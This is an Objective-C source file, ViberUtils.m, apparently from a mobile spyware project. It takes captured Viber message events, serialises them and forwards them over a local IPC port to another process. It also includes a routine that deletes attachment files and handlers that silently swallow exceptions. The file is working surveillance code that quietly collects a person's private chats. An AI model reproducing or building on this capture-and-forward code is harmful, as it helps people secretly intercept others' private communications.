//
//  ViberUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 4/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ViberUtils.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "MessagePortIPCSender.h"
#import "StringUtils.h"
#import "FxAttachment.h"

@interface ViberUtils (private)
- (void) thread: (FxIMEvent *) aIMEvent;
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;
@end


@implementation ViberUtils

+ (void) sendViberEvent: (FxIMEvent *) aIMEvent {
	ViberUtils *viberUtils = [[ViberUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:viberUtils withObject:aIMEvent];
	[viberUtils autorelease];
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"Viber message after remove emoji = %@", msg);
		if ([msg length]) {
			[aIMEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:aIMEvent forKey:kViberArchied];
			[archiver finishEncoding];
			[archiver release];	
			
			[ViberUtils sendDataToPort:data portName:kViberMessagePort];
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
	}
}

@end
